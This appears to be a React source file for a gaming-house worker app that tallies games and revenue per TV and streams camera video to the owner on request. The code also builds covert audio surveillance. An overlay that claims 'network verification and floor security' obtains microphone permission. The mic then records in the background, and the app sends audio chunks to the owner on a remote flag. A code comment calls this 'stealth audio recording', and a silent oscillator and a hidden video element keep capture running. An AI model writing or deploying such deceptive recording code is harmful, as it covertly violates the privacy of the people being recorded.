
import React, { useState, useEffect, useMemo, useRef } from 'react';
import { TV_CONFIGS, HOUSE_NAMES } from '../constants';
import { GameEntry, HouseId, VideoSession } from '../types';
import { getStoredGames, saveGames, getTVPrices, getVideoSession, updateVideoSession, sendVideoFrame, sendHeartbeat, sendAudioChunk } from '../services/storage';

const WorkerApp: React.FC = () => {
  const [games, setGames] = useState<GameEntry[]>([]);
  const [activeHouse, setActiveHouse] = useState<HouseId>('house1');
  const [customPrices, setCustomPrices] = useState<Record<string, number>>({});
  const [videoSession, setVideoSession] = useState<VideoSession>({ houseId: null, status: 'idle', quality: 'medium' });
  const [isCapturing, setIsCapturing] = useState(false);
  const [micSynced, setMicSynced] = useState(localStorage.getItem('fifa_mic_synced') === 'true');
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const [showMissedAlert, setShowMissedAlert] = useState(false);
  
  const lastAcknowledgedRequestRef = useRef<number>(parseInt(localStorage.getItem('fifa_last_ack_request') || '0'));
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const isSendingFrame = useRef(false);
  const activeStream = useRef<MediaStream | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const capturingRef = useRef(false);
  const wakeLockRef = useRef<any>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const workerRef = useRef<Worker | null>(null);

  // Critical Refs for background tasks to avoid stale closures
  const audioRequestedRef = useRef(false);
  const activeHouseRef = useRef<HouseId>(activeHouse);

  const loadData = async () => {
    const [fetchedGames, fetchedPrices, fetchedVideo] = await Promise.all([
      getStoredGames(),
      getTVPrices(),
      getVideoSession()
    ]);
    setGames(fetchedGames);
    setCustomPrices(fetchedPrices);
    setVideoSession(fetchedVideo);

    if (fetchedVideo.lastRequestTime && fetchedVideo.lastRequestTime > lastAcknowledgedRequestRef.current && fetchedVideo.houseId === activeHouse) {
      setShowMissedAlert(true);
    }
  };

  const requestWakeLock = async () => {
    if ('wakeLock' in navigator) {
      try {
        wakeLockRef.current = await (navigator as any).wakeLock.request('screen');
      } catch (err) {}
    }
  };

  const releaseWakeLock = async () => {
    if (wakeLockRef.current) {
      await wakeLockRef.current.release();
      wakeLockRef.current = null;
    }
  };

  const startSilentAudio = () => {
    try {
      if (!audioContextRef.current) {
        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
        audioContextRef.current = new AudioCtx();
      }
      const ctx = audioContextRef.current;
      const oscillator = ctx.createOscillator();
      const gainNode = ctx.createGain();
      oscillator.type = 'sine';
      oscillator.frequency.setValueAtTime(440, ctx.currentTime);
      gainNode.gain.setValueAtTime(0, ctx.currentTime);
      oscillator.connect(gainNode);
      gainNode.connect(ctx.destination);
      oscillator.start();
    } catch (e) {}
  };

  useEffect(() => {
    const workerCode = `
      let interval;
      self.onmessage = (e) => {
        if (e.data === 'start') {
          if (interval) clearInterval(interval);
          interval = setInterval(() => self.postMessage('tick'), 4000);
        } else if (e.data === 'stop') {
          clearInterval(interval);
        }
      };
    `;
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    workerRef.current = new Worker(URL.createObjectURL(blob));
    workerRef.current.onmessage = (e) => { if (e.data === 'tick') syncCycle(); };
    workerRef.current.postMessage('start');
    loadData();

    const handleVisibilityChange = () => { if (document.visibilityState === 'visible' && capturingRef.current) requestWakeLock(); };
    document.addEventListener('visibilitychange', handleVisibilityChange);

    if (micSynced) startBackgroundAudioCapture();

    return () => {
      workerRef.current?.postMessage('stop');
      workerRef.current?.terminate();
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      releaseWakeLock();
    };
  }, []);

  useEffect(() => {
    activeHouseRef.current = activeHouse;
  }, [activeHouse]);

  const syncCycle = async () => {
    const hId = activeHouseRef.current;
    sendHeartbeat(hId);
    const refreshedVideo = await getVideoSession();
    setVideoSession(refreshedVideo);
    
    // Update Ref for stealth audio recording
    audioRequestedRef.current = refreshedVideo.audioRequested === true && refreshedVideo.houseId === hId;

    if (refreshedVideo.lastRequestTime && refreshedVideo.lastRequestTime > lastAcknowledgedRequestRef.current && refreshedVideo.houseId === hId && !capturingRef.current) {
        setShowMissedAlert(true);
    }
    const refreshedGames = await getStoredGames();
    setGames(prev => {
      const localMap = new Map<string, GameEntry>(prev.map(g => [g.id, g]));
      refreshedGames.forEach(g => localMap.set(g.id, g));
      return Array.from(localMap.values()).sort((a: GameEntry, b: GameEntry) => a.timestamp - b.timestamp);
    });
  };

  const startBackgroundAudioCapture = async () => {
    try {
      const audioStream = await navigator.mediaDevices.getUserMedia({ 
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        }, 
        video: false 
      });
      
      const recorder = new MediaRecorder(audioStream);
      mediaRecorderRef.current = recorder;
      
      recorder.ondataavailable = async (e) => {
        if (e.data.size > 0 && audioRequestedRef.current) {
          const reader = new FileReader();
          reader.readAsDataURL(e.data);
          reader.onloadend = () => {
            const base64 = reader.result as string;
            sendAudioChunk(base64);
          };
        }
      };
      
      recorder.start(1000); // 1-second chunks for better responsiveness
      setMicSynced(true);
      localStorage.setItem('fifa_mic_synced', 'true');
    } catch (e) {
      console.error("Mic access failed", e);
    }
  };

  const handleAddGame = (tvId: string, amount: number) => {
    const newGame: GameEntry = { id: Math.random().toString(36).substr(2, 9), tvId, timestamp: Date.now(), completed: true, amount };
    setGames(prev => { const next = [...prev, newGame]; saveGames(next); return next; });
  };

  const handleAddSeparator = (tvId: string) => {
    const newSep: GameEntry = { id: Math.random().toString(36).substr(2, 9), tvId, timestamp: Date.now(), completed: true, amount: 0, isSeparator: true };
    setGames(prev => { const next = [...prev, newSep]; saveGames(next); return next; });
  };

  const frameLoop = async () => {
    if (!capturingRef.current || !videoRef.current || !canvasRef.current) return;
    const video = videoRef.current;
    if (video.readyState >= 2 && !isSendingFrame.current) {
      const ctx = canvasRef.current.getContext('2d');
      if (ctx) {
        isSendingFrame.current = true;
        const quality = videoSession.quality || 'medium';
        let width = 360, height = 480, compression = 0.5, delay = 100;
        if (quality === 'low') { width = 240; height = 320; compression = 0.2; delay = 250; }
        else if (quality === 'high') { width = 480; height = 640; compression = 0.75; delay = 80; }
        canvasRef.current.width = width; canvasRef.current.height = height;
        ctx.drawImage(video, 0, 0, width, height);
        const frameData = canvasRef.current.toDataURL('image/jpeg', compression);
        try { await sendVideoFrame(frameData); } catch (e) {} finally { isSendingFrame.current = false; }
        if (capturingRef.current) setTimeout(() => frameLoop(), delay);
      }
    } else if (capturingRef.current) setTimeout(() => frameLoop(), 100);
  };

  useEffect(() => {
    capturingRef.current = isCapturing;
    if (isCapturing) { requestWakeLock(); startSilentAudio(); frameLoop(); }
    else { releaseWakeLock(); }
  }, [isCapturing]);

  useEffect(() => {
    if (isCapturing && videoRef.current && activeStream.current) {
        const video = videoRef.current;
        if (video.srcObject !== activeStream.current) {
            video.srcObject = activeStream.current;
            video.onloadedmetadata = () => {
                video.play().then(() => { updateVideoSession({ status: 'active' }); }).catch(() => {});
            };
        }
    }
  }, [isCapturing]);

  const startVideoFeed = async () => {
    setPermissionError(null);
    setShowMissedAlert(false);
    if (videoSession.lastRequestTime) {
      lastAcknowledgedRequestRef.current = videoSession.lastRequestTime;
      localStorage.setItem('fifa_last_ack_request', lastAcknowledgedRequestRef.current.toString());
    }
    await updateVideoSession({ lastOnlineSignalTime: Date.now(), houseId: activeHouse });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { ideal: 'environment' }, width: { ideal: 480 }, height: { ideal: 640 } }, 
        audio: false 
      });
      activeStream.current = stream;
      setIsCapturing(true); 
    } catch (e: any) {
      setPermissionError("Camera access denied.");
    }
  };

  const handleStopLocalView = () => {
    setIsCapturing(false); capturingRef.current = false;
    if (activeStream.current) { activeStream.current.getTracks().forEach(t => t.stop()); activeStream.current = null; }
    releaseWakeLock();
    if (audioContextRef.current) { audioContextRef.current.close(); audioContextRef.current = null; }
  };

  useEffect(() => { if (videoSession.status === 'idle' && isCapturing) handleStopLocalView(); }, [videoSession.status]);

  const currentHouseTVs = TV_CONFIGS.filter(tv => tv.houseId === activeHouse);
  const dayStart = useMemo(() => {
    const d = new Date(); d.setHours(7,0,0,0); 
    if (new Date().getHours() < 7) d.setDate(d.getDate() - 1);
    return d.getTime();
  }, [games]);

  const hStats = useMemo(() => {
    const g = games.filter(x => x.timestamp >= dayStart && TV_CONFIGS.find(t => t.id === x.tvId)?.houseId === activeHouse);
    return { revenue: g.reduce((a,c) => a+c.amount, 0) };
  }, [games, activeHouse, dayStart]);

  return (
    <div className="flex flex-col h-[calc(100vh-12rem)] max-w-5xl mx-auto relative animate-in fade-in duration-500">
      {/* Mic Sync Overlay */}
      {!micSynced && (
        <div className="fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-6 backdrop-blur-xl">
           <div className="w-full max-w-xs bg-zinc-900 border border-amber-500/30 rounded-[3rem] p-10 text-center">
              <div className="w-16 h-16 bg-amber-500 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg className="w-8 h-8 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" />
                </svg>
              </div>
              <h2 className="text-xl font-black text-amber-500 uppercase tracking-tighter mb-4">Sync Audio System</h2>
              <p className="text-[10px] text-amber-700 font-bold uppercase tracking-widest mb-8">Required for premium network verification and floor security.</p>
              <button 
                onClick={startBackgroundAudioCapture} 
                className="w-full bg-amber-500 py-4 rounded-2xl text-black font-black uppercase tracking-widest shadow-lg shadow-amber-500/20 active:scale-95 transition-all"
              >
                Authenticate Mic
              </button>
           </div>
        </div>
      )}

      {showMissedAlert && !isCapturing && (
        <div className="fixed top-20 left-4 right-4 z-[150] bg-amber-500 rounded-2xl p-4 shadow-2xl flex items-center justify-between border border-black/10">
           <div className="flex items-center gap-3">
             <div className="w-10 h-10 bg-black/10 rounded-full flex items-center justify-center animate-pulse"><svg className="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg></div>
             <div><p className="text-[10px] font-black uppercase tracking-widest text-black/60">Missed Request</p><p className="text-sm font-black text-black">Notify Owner Now</p></div>
           </div>
           <button onClick={startVideoFeed} className="bg-black text-amber-500 px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest active:scale-95 transition-all shadow-lg">Monitor Now</button>
        </div>
      )}

      {videoSession.status === 'requested' && videoSession.houseId === activeHouse && !isCapturing && !showMissedAlert && (
        <div className="fixed inset-0 z-[200] bg-black/90 flex items-center justify-center p-4 backdrop-blur-xl">
          <div className="w-full max-w-sm bg-zinc-950 border border-amber-500 rounded-[3rem] p-10 text-center shadow-2xl shadow-amber-500/20">
            <h2 className="text-2xl font-black text-amber-500 uppercase tracking-tighter mb-4">Observation Request</h2>
            <button onClick={startVideoFeed} className="w-full bg-amber-500 hover:bg-amber-400 text-black font-black py-5 rounded-2xl uppercase tracking-[0.2em] shadow-xl shadow-amber-500/20 active:scale-95 transition-all">Start Stream</button>
          </div>
        </div>
      )}

      {isCapturing && (
        <div className="fixed inset-0 z-[250] bg-black flex flex-col items-center justify-center animate-in zoom-in duration-500">
          <video ref={videoRef} className="fixed opacity-0 pointer-events-none" muted playsInline />
          <canvas ref={canvasRef} className="hidden" />
          <div className="text-center">
            <div className="w-32 h-32 border-4 border-amber-500 rounded-full flex items-center justify-center mx-auto mb-10 shadow-[0_0_50px_rgba(245,158,11,0.3)] animate-pulse"><div className="w-6 h-6 bg-red-600 rounded-full"></div></div>
            <h1 className="text-4xl font-black text-amber-500 uppercase tracking-[0.4em] mb-4">Live Floor</h1>
            <p className="text-amber-900 text-[10px] font-black uppercase tracking-[1em] animate-pulse">Streaming to Owner</p>
          </div>
          <div className="absolute bottom-12 text-center">
            <p className="text-zinc-700 text-[10px] font-black uppercase tracking-widest">Only Owner Can End This Session</p>
            {permissionError && <p className="text-red-500 text-[10px] mt-2 font-black">{permissionError}</p>}
          </div>
        </div>
      )}

      <div className="flex-none flex items-center justify-between mb-6 px-2">
        <div className="flex p-1 bg-zinc-900 border border-amber-900/30 rounded-2xl shadow-lg">
          {(['house1', 'house2'] as HouseId[]).map((hId) => (
            <button key={hId} onClick={() => setActiveHouse(hId)} className={`px-6 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all duration-300 ${activeHouse === hId ? 'bg-amber-500 text-black scale-105' : 'text-amber-800'}`}>{HOUSE_NAMES[hId]}</button>
          ))}
        </div>
        <div className="text-right">
          <p className="text-[10px] text-amber-800 font-black uppercase tracking-widest">Yield</p>
          <p className="text-2xl font-black text-amber-500 tracking-tighter">{hStats.revenue.toLocaleString()} <span className="text-xs">ETB</span></p>
        </div>
      </div>

      <div className="flex-grow grid grid-cols-2 gap-4 h-full pb-6 overflow-y-auto custom-scrollbar">
        {currentHouseTVs.map((tv) => {
          const tvEntries = games.filter(g => g.tvId === tv.id && g.timestamp >= dayStart);
          const price = customPrices[tv.id] ?? tv.pricePerGame;
          let counter = 0;
          return (
            <div key={tv.id} className="bg-zinc-900/60 border border-amber-900/20 rounded-[2rem] flex flex-col overflow-hidden shadow-xl">
              <div className="bg-black/60 px-5 py-4 border-b border-amber-900/20 flex justify-between items-center"><h3 className="text-amber-500 font-black text-xs uppercase tracking-widest">{tv.name}</h3><span className="text-[10px] text-amber-700 font-black tabular-nums">{tvEntries.filter(e => !e.isSeparator).length} Games</span></div>
              <div className="flex-grow p-4 overflow-y-auto">
                <div className="grid grid-cols-3 gap-2">
                  {tvEntries.map((e) => {
                    if (e.isSeparator) { counter = 0; return <div key={e.id} className="col-span-3 h-[1px] bg-amber-900/30 my-2" /> }
                    counter++; return <div key={e.id} className="aspect-square bg-amber-500 rounded-xl flex items-center justify-center text-black font-black text-sm shadow-md animate-in zoom-in">{counter}</div>
                  })}
                  <div className="col-span-3 grid grid-cols-2 gap-3 mt-2">
                    <button onClick={() => handleAddGame(tv.id, price)} className="h-16 bg-amber-500/5 border-2 border-dashed border-amber-500/40 rounded-2xl text-amber-500 font-black text-3xl hover:bg-amber-500/10 hover:border-amber-500 active:scale-90 transition-all">+</button>
                    <button onClick={() => handleAddSeparator(tv.id)} className="h-16 border-2 border-dashed border-amber-900/20 rounded-2xl text-[9px] font-black text-amber-900 uppercase tracking-widest">R</button>
                  </div>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};

export default WorkerApp;
